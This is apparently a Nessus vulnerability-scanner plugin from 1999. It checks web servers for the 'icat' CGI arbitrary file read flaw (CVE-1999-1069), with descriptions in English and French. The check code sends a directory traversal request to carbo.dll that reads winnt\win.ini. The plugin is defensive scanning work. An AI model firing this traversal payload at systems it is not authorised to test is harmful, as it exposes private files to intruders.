#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10112);
 script_bugtraq_id(2126);
 script_version ("$Revision: 1.24 $");
 script_cve_id("CVE-1999-1069");
 name["english"] = "icat";
 name["francais"] = "icat";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "Several versions of the 'icat' CGI allow a remote
user to read arbitrary file on the target system. Make sure you
are running the latest version of icat.

Solution : Upgrade to the latest version of icat
Risk factor : High
";

 desc["francais"] = "Plusieurs versions du CGI 'icat' permettent
à un cracker de lire des fichiers arbitraires sur la machine cible.
Assurez-vous que vous faites tourner la derniere version de icat.

Facteur de risque : Elevé.

Solution : Upgradez icat s'il est trop vieux";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Determines the presence of the 'icat' cgi";
 summary["francais"] = "Determines la presence de icat";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 req = string(dir,
 "/carbo.dll?icatcommand=..\\..\\..\\..\\..\\..\\winnt\\win.ini&catalogname=catalog");
 req = http_get(item:req, port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL ) exit(0);
 if("[fonts]" >< r)security_hole(port);
}
